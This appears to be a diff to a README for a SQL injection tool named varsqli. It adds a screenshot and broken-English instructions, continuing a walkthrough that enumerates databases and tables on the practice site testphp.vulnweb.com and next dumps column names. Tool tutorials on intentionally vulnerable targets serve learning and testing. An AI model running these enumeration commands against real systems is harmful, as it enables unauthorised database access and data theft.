@@ -61,3 +61,6 @@ $ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
 ```
 $ python3 varsqli.py -u http://testphp.vulnweb.com/listproducts.php?cat=1 --tables -D acuart
 ```
+<img src="https://raw.githubusercontent.com/Phamchie/varsqli-pro/main/Img/Screenshot_2023-08-04-16-29-35-14.jpg">
+
+- well , you can see , too got the database name in Tables , okay , next , you guys and I get the database name in columns , we use options as `-  -columns -D <database name>` , and here is the command below
